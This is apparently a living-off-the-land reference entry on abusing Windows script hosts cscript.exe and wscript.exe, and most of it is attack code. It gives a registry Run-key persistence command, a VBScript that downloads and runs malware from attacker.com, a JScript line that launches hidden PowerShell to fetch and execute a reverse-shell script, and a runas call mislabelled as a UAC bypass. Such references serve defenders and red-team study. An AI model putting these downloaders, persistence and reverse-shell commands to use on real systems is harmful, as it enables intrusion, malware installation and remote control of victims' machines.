# cscript.exe / wscript.exe
## What is it?
*Windows script host interpreters for VBScript and JScript.*

## Legitimate Use
- *Used for executing administrative scripts.*

## How to Abuse it
- *Attackers can use them to execute malicious VBScripts for persistence.*

## Example Attacks
```
wscript.exe C:\malicious.vbs

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousScript /t REG_SZ /d "wscript.exe C:\Users\Public\malicious.vbs"
```
*vbs script*
```
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")

objXMLHTTP.Open "GET", "http://attacker.com/malware.exe", False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0
    objADOStream.SaveToFile "C:\Users\Public\malware.exe", 2
    objADOStream.Close
    CreateObject("WScript.Shell").Run "C:\Users\Public\malware.exe"
End If
```

```
wscript.exe C:\Users\Public\malicious.vbs

```
*js script*
```
var shell = new ActiveXObject("WScript.Shell");
shell.run("powershell -NoP -NonI -W Hidden -Exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/reverse.ps1')\"");
```

```
cscript.exe C:\Users\Public\reverse_shell.js
```
*fileless*
```
wscript.exe /E:vbscript /B "Execute(""msgbox(""aSimpleMessage"")"")"
```
*UAC Bypass via WScript.Shell*
```
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cmd.exe", "/c C:\Users\Public\malware.exe", "", "runas", 1
```
*multi-script.wsf*
```
<job>
    <script language="VBScript">
        WScript.Echo "Running VBScript"
    </script>
    <script language="JScript">
        WScript.Echo("Running JScript");
    </script>
</job>
```
```
wscript.exe C:\Users\Public\malicious.wsf
```
